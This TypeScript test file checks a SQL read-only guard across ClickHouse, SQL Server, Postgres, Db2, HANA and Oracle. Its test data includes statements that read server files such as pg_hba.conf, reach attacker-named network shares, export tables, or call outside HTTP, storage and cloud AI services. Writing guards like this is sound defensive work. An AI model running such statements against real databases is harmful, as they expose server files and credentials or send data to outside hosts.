/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { describe, test } from 'node:test';
import assert from 'node:assert/strict';

import { autoRunBlocker, readOnlyError } from '../context/tools';
import { clickhouseTableFunction, writingCall } from './sideEffects';
import { destructiveStatement, guardStatements, serverFileAccess, uncPath } from './sqlGuard';

// Reads that act outside the database: a fetch from another server, a file or a directory on the
// database server, a network share the server signs in to, a cloud AI service, a plan written into
// a table. Each family is refused by a RULE where one can be written, so the next function of the
// same kind is refused without being named.

describe('ClickHouse: a table function that reaches outside the server is not a read', () => {
	const refused = [
		"SELECT * FROM url('http://x', CSV, 'a String')",
		"SELECT * FROM urlCluster('c', 'http://x', CSV)",
		"SELECT * FROM remote('10.0.0.1', db.t)",
		"SELECT * FROM remoteSecure('10.0.0.1:9440', db.t, 'u', 'p')",
		"SELECT * FROM s3('https://b.s3.amazonaws.com/k.csv')",
		"SELECT * FROM s3Cluster('c', 'https://b.s3.amazonaws.com/k.csv')",
		"SELECT * FROM gcs('https://storage.googleapis.com/b/k.csv')",
		"SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')",
		"SELECT * FROM postgresql('h:5432', 'db', 't', 'u', 'p')",
		"SELECT * FROM mongodb('h:27017', 'db', 'c', 'u', 'p', 'x String')",
		"SELECT * FROM redis('h:6379', 'k', 'k String, v String')",
		"SELECT * FROM jdbc('datasource', 'db', 't')",
		"SELECT * FROM odbc('DSN=x', 'db', 't')",
		"SELECT * FROM hdfs('hdfs://h:9000/f', 'TSV', 'a String')",
		"SELECT * FROM azureBlobStorage('DefaultEndpointsProtocol=https;...', 'c', 'k.csv')",
		"SELECT * FROM file('secrets.csv')",
		"SELECT * FROM executable('script.sh', TSV, 'x UInt8')",
		"SELECT * FROM input('x UInt8')",
		"SELECT * FROM icebergS3('https://b.s3.amazonaws.com/t/')",
		// Not a name anybody listed: in a table's place, only the local table functions pass.
		"SELECT * FROM someTableFunctionFromNextYear('http://x')",
		// In a JOIN, a FROM list, a subquery, a CTE, a view, an EXPLAIN, a DESCRIBE.
		"SELECT * FROM t1 JOIN url('http://x', CSV) AS u ON t1.id = u.id",
		"SELECT * FROM t1 GLOBAL ANY LEFT JOIN s3('https://x/k.csv') AS u USING (id)",
		"SELECT * FROM numbers(1) AS n, url('http://x', CSV)",
		"SELECT * FROM (SELECT * FROM s3('https://x/k.csv'))",
		"WITH a AS (SELECT * FROM url('http://x', CSV)) SELECT * FROM a",
		"SELECT * FROM view(SELECT * FROM url('http://x', CSV))",
		"SELECT 1 WHERE 1 IN (SELECT * FROM url('http://x', CSV))",
		"EXPLAIN SELECT * FROM url('http://x', CSV)",
		"DESCRIBE TABLE s3('https://x/k.parquet')",
		"DESC url('http://x', CSV)",
		// Wherever else the known ones are written.
		"SELECT count() FROM loop(url('http://x', CSV))",
		"SELECT 1 WHERE 1 IN url('http://x', CSV)",
		"SELECT file('secrets.txt')",
	];
	const reads = [
		'SELECT * FROM system.tables',
		'SELECT number FROM numbers(10)',
		'SELECT * FROM numbers_mt(1000) LIMIT 5',
		"SELECT * FROM generateRandom('a UInt8', 1) LIMIT 3",
		'SELECT * FROM zeros(3)',
		"SELECT * FROM merge(currentDatabase(), '^events')",
		"SELECT * FROM cluster('default', system.tables)",
		"SELECT * FROM clusterAllReplicas('default', system.query_log) LIMIT 10",
		"SELECT * FROM format(JSONEachRow, '{\"a\": 1}')",
		'SELECT * FROM view(SELECT 1)',
		"SELECT * FROM values('a UInt8', 1, 2)",
		'SELECT toDate(ts) AS d, count() FROM events WHERE ts > now() - INTERVAL 1 DAY GROUP BY d ORDER BY d',
		'SELECT domain(url), URLHash(url) FROM logs',
		'SELECT extract(DAY FROM toDate(ts)), substring(s FROM 2 FOR 3), trim(BOTH \' \' FROM s) FROM t',
		'SELECT * FROM events AS e LEFT JOIN users AS u ON e.uid = u.id',
		'SELECT * FROM t1 ARRAY JOIN range(3) AS r',
		'SELECT a, lower(b) FROM (SELECT x AS a, upper(y) AS b FROM t)',
		"SELECT dictGet('d', 'attr', toUInt64(1))",
		'SELECT * FROM t WHERE x IN (1, 2)',
		'DESCRIBE TABLE system.tables',
		'EXPLAIN PLAN json = 1, indexes = 1 SELECT * FROM numbers(3)',
		'SELECT * FROM t SETTINGS max_threads = 1',
	];

	test('the read check refuses it, and says why', () => {
		for (const sql of refused) {
			assert.ok(clickhouseTableFunction(sql, 'clickhouse'), sql);
			assert.match(readOnlyError(sql, 'clickhouse') ?? '', /table function|outside/, sql);
			assert.ok(autoRunBlocker(sql, { driver: 'clickhouse' }), sql);
		}
		assert.equal(clickhouseTableFunction("SELECT * FROM url('http://x', CSV)", 'clickhouse'), 'url');
	});

	test('ordinary reads still pass', () => {
		for (const sql of reads) {
			assert.equal(clickhouseTableFunction(sql, 'clickhouse'), undefined, sql);
			assert.equal(readOnlyError(sql, 'clickhouse'), undefined, sql);
		}
	});

	test('the rule is ClickHouse\'s, so a Postgres set-returning function is not a table function', () => {
		assert.equal(readOnlyError('SELECT * FROM generate_series(1, 10)', 'postgres'), undefined);
		assert.equal(readOnlyError("SELECT * FROM json_each('{}')", 'postgres'), undefined);
	});
});

describe('SQL Server: a file on the server or a network share is not a read', () => {
	test('the functions that read a server file are refused by every gate', () => {
		for (const [sql, name] of [
			["SELECT * FROM sys.fn_get_audit_file('\\\\attacker\\share\\*.sqlaudit', DEFAULT, DEFAULT)", 'FN_GET_AUDIT_FILE'],
			["SELECT * FROM sys.fn_get_audit_file('C:\\audit\\*.sqlaudit', DEFAULT, DEFAULT)", 'FN_GET_AUDIT_FILE'],
			["SELECT * FROM sys.fn_get_audit_file_v2('C:\\audit\\*.sqlaudit', DEFAULT, DEFAULT, DEFAULT, DEFAULT)", 'FN_GET_AUDIT_FILE_V2'],
			["SELECT * FROM fn_trace_gettable('\\\\attacker\\share\\t.trc', DEFAULT)", 'FN_TRACE_GETTABLE'],
			["SELECT * FROM sys.fn_xe_file_target_read_file('\\\\attacker\\s\\x*.xel', NULL, NULL, NULL)", 'FN_XE_FILE_TARGET_READ_FILE'],
			["SELECT * FROM sys.dm_os_enumerate_filesystem('C:\\', '*')", 'DM_OS_ENUMERATE_FILESYSTEM'],
			["SELECT * FROM sys.dm_os_file_exists('C:\\x.txt')", 'DM_OS_FILE_EXISTS'],
			["SELECT * FROM fn_dump_dblog(NULL, NULL, 'DISK', 1, 'C:\\b.bak', DEFAULT)", 'FN_DUMP_DBLOG'],
		] as const) {
			assert.equal(guardStatements(sql, 'sqlserver').map(serverFileAccess).find(Boolean), name, sql);
			assert.ok(destructiveStatement(sql, 'sqlserver'), sql);
			assert.ok(readOnlyError(sql, 'sqlserver'), sql);
		}
	});

	test('a string that names a network path is refused in a read, whatever function it is handed to', () => {
		for (const sql of [
			"SELECT * FROM some_new_fn('\\\\attacker\\share\\x')",
			"SELECT 1 WHERE N'\\\\host\\c$\\x' IS NOT NULL",
			"SELECT * FROM t WHERE p = '//attacker/share/x'",
			"SELECT '\\\\?\\UNC\\attacker\\share'",
			"SELECT '\\\\attacker@SSL@443\\davwwwroot\\x'",
		]) {
			assert.ok(uncPath(sql, 'sqlserver'), sql);
			assert.match(readOnlyError(sql, 'sqlserver') ?? '', /network path/, sql);
		}
		// An unknown driver is read every way there is, SQL Server's included.
		assert.ok(readOnlyError("SELECT f('\\\\attacker\\share')", 'some-new-driver'));
	});

	test('ordinary strings with a backslash still pass', () => {
		for (const sql of [
			"SELECT 'C:\\temp\\file.txt' AS path",
			"SELECT REPLACE(path, '\\', '/') FROM files",
			"SELECT REPLACE(p, '\\\\', '\\') FROM t",
			"SELECT * FROM users WHERE login = 'CORP\\jdoe'",
			"SELECT name FROM t WHERE note LIKE '%\\%'",
			"SELECT 'https://example.com/x' AS link",
			"SELECT * FROM sys.fn_trace_getinfo(0)",
			'SELECT name, physical_name FROM sys.master_files',
		]) {
			assert.equal(uncPath(sql, 'sqlserver'), undefined, sql);
			assert.equal(readOnlyError(sql, 'sqlserver'), undefined, sql);
		}
		// A person's own read on a read-only connection may compare a column with a share's name.
		assert.equal(destructiveStatement("SELECT * FROM shares WHERE path = '\\\\fs01\\data'", 'sqlserver'), undefined);
		// The rule is SQL Server's: a Postgres string is not opened as a path by a read.
		assert.equal(uncPath("SELECT '\\\\host\\share'", 'postgres'), undefined);
	});
});

describe('cloud AI services and the server\'s directories are not reads', () => {
	test('a call into a cloud-integration schema is refused, whatever the function is called', () => {
		for (const sql of [
			"SELECT aws_bedrock.invoke_model('m', 'application/json', 'application/json', '{}')",
			"SELECT aws_sagemaker.invoke_endpoint('e', NULL, 'x')",
			"SELECT aws_comprehend.detect_sentiment('x', 'en')",
			"SELECT aws_something_new.do_it('x')",
			"SELECT azure_openai.create_embeddings('m', 'x')",
			"SELECT azure_cognitive.analyze_sentiment('x', 'en')",
			"SELECT azure_ai.set_setting('azure_openai.endpoint', 'https://x')",
			"SELECT azure_ml.invoke('{}')",
			"SELECT google_ml.predict_row('m', '{}')",
			"SELECT google_ml.embedding('m', 'x')",
			"SELECT ai.openai_embed('text-embedding-3-small', 'x')",
			"SELECT ai.generate(prompt => 'x')",
			"SELECT net.http_get('https://x')",
			"SELECT http.http_post('https://x', 'x', 'text/plain')",
			// And the ones a search_path reaches without a schema.
			"SELECT ml_predict_row('projects/p/locations/l/endpoints/e', '{}')",
			"SELECT embedding('text-embedding-005', 'x')",
			"SELECT http_get('https://x')",
		]) {
			assert.ok(writingCall(sql, 'postgres'), sql);
			assert.match(readOnlyError(sql, 'postgres') ?? '', /outside it/, sql);
		}
	});

	test('the server\'s files and directories are refused as a family', () => {
		for (const [sql, name] of [
			["SELECT * FROM pg_ls_dir('.')", 'PG_LS_DIR'],
			['SELECT * FROM pg_ls_logdir()', 'PG_LS_LOGDIR'],
			['SELECT sum(size) FROM pg_ls_waldir()', 'PG_LS_WALDIR'],
			['SELECT * FROM pg_ls_tmpdir()', 'PG_LS_TMPDIR'],
			['SELECT * FROM pg_ls_archive_statusdir()', 'PG_LS_ARCHIVE_STATUSDIR'],
			["SELECT * FROM pg_stat_file('postgresql.conf')", 'PG_STAT_FILE'],
			["SELECT pg_read_file('pg_hba.conf')", 'PG_READ_FILE'],
			["SELECT pg_catalog.pg_read_binary_file('global/pg_control')", 'PG_READ_BINARY_FILE'],
		] as const) {
			assert.equal(guardStatements(sql, 'postgres').map(serverFileAccess).find(Boolean), name, sql);
			assert.ok(destructiveStatement(sql, 'postgres'), sql);
			assert.match(readOnlyError(sql, 'postgres') ?? '', /file on the database server/, sql);
		}
	});

	test('reads that only look like them still pass', () => {
		for (const sql of [
			'SELECT * FROM pg_stat_activity',
			'SELECT pg_size_pretty(pg_database_size(current_database()))',
			'SELECT * FROM pg_stat_user_tables',
			"SELECT count(*) FROM orders WHERE aws_region = 'us-west-2'",
			'SELECT azure_id, google_ml_score, ai.score FROM t AS ai',
			'SELECT * FROM aws_accounts',
			'SELECT * FROM public.aws_regions',
			"SELECT t.embedding <-> '[1,2,3]' FROM items t",
			"SELECT 'pg_ls_dir', 'aws_bedrock.invoke_model'",
		]) {
			assert.equal(readOnlyError(sql, 'postgres'), undefined, sql);
		}
	});
});

describe('Db2, SAP HANA and Oracle: an EXPLAIN that stores the plan is a write', () => {
	const persisting: [string, string][] = [
		['EXPLAIN PLAN FOR SELECT * FROM orders', 'db2'],
		['EXPLAIN PLAN SET QUERYNO = 1 FOR SELECT 1 FROM sysibm.sysdummy1', 'db2'],
		['EXPLAIN ALL FOR SELECT * FROM t', 'db2'],
		['EXPLAIN PLAN FOR SELECT * FROM orders', 'hana'],
		["EXPLAIN PLAN SET STATEMENT_NAME = 'x' FOR SELECT * FROM dummy", 'hana'],
		['EXPLAIN PLAN FOR SELECT * FROM orders', 'oracle'],
		["EXPLAIN PLAN SET STATEMENT_ID = 'x' INTO my_table FOR SELECT * FROM t", 'oracle'],
		['explain plan for select 1 from dual', 'oracle'],
		['/* a note */ EXPLAIN PLAN FOR SELECT 1 FROM dual', 'oracle'],
	];

	test('every gate refuses it: the read check, Always allow, and the production and read-only checks', () => {
		for (const [sql, driver] of persisting) {
			assert.match(readOnlyError(sql, driver) ?? '', /EXPLAIN/, `${driver}: ${sql}`);
			assert.ok(autoRunBlocker(sql, { driver }), `${driver}: ${sql}`);
			assert.equal(destructiveStatement(sql, driver)?.verb, 'EXPLAIN', `${driver}: ${sql}`);
		}
	});

	test('an EXPLAIN that only answers is still a read where it only answers', () => {
		for (const [sql, driver] of [
			['EXPLAIN SELECT 1', 'postgres'],
			['EXPLAIN (FORMAT JSON) SELECT 1', undefined],
			['EXPLAIN FORMAT=JSON SELECT 1', 'mysql-aurora'],
			['EXPLAIN USING TEXT SELECT * FROM orders', 'snowflake'],
			['EXPLAIN PLAN json = 1 SELECT 1', 'clickhouse'],
			['EXPLAIN QUERY PLAN SELECT 1', 'sqlite'],
		] as const) {
			assert.equal(readOnlyError(sql, driver), undefined, `${driver}: ${sql}`);
			assert.equal(destructiveStatement(sql, driver), undefined, `${driver}: ${sql}`);
		}
	});

	test('Db2\'s message queue and HTTP functions are refused in a read', () => {
		for (const sql of [
			"SELECT DB2MQ.MQSEND('hello') FROM sysibm.sysdummy1",
			"VALUES MQSEND('x')",
			'SELECT MQRECEIVE() FROM sysibm.sysdummy1',
			'SELECT MQRECEIVECLOB() FROM sysibm.sysdummy1',
			'SELECT * FROM TABLE(MQRECEIVEALL()) AS t',
			'SELECT MQREAD() FROM sysibm.sysdummy1',
			"VALUES DB2MQ.MQPUBLISH('x')",
			"VALUES MQSUBSCRIBE('topic')",
			"SELECT DB2MQ1C.MQSEND('x') FROM sysibm.sysdummy1",
			"SELECT SYSTOOLS.HTTPGETCLOB('https://x', '') FROM sysibm.sysdummy1",
			"SELECT DB2XML.SOAPHTTPNC('https://x', '', '') FROM sysibm.sysdummy1",
			"CALL SYSPROC.ADMIN_CMD('EXPORT TO /tmp/x OF DEL SELECT * FROM t')",
		]) {
			assert.ok(readOnlyError(sql, 'db2'), sql);
		}
	});

	test('ordinary Db2, HANA and Oracle reads still pass', () => {
		for (const [sql, driver] of [
			['SELECT * FROM SYSCAT.TABLES FETCH FIRST 10 ROWS ONLY', 'db2'],
			['VALUES (1, 2)', 'db2'],
			["SELECT * FROM TABLE(SYSPROC.ADMIN_GET_TAB_INFO('S', 'T')) AS t", 'db2'],
			['SELECT mq_id, http_status FROM mq_messages', 'db2'],
			['SELECT * FROM EXPLAIN_PLAN_TABLE', 'hana'],
			['SELECT * FROM dummy', 'hana'],
			['SELECT * FROM plan_table', 'oracle'],
			["SELECT * FROM TABLE(DBMS_XPLAN.DISPLAY_CURSOR('abc', 0))", 'oracle'],
		] as const) {
			assert.equal(readOnlyError(sql, driver), undefined, `${driver}: ${sql}`);
		}
	});
});
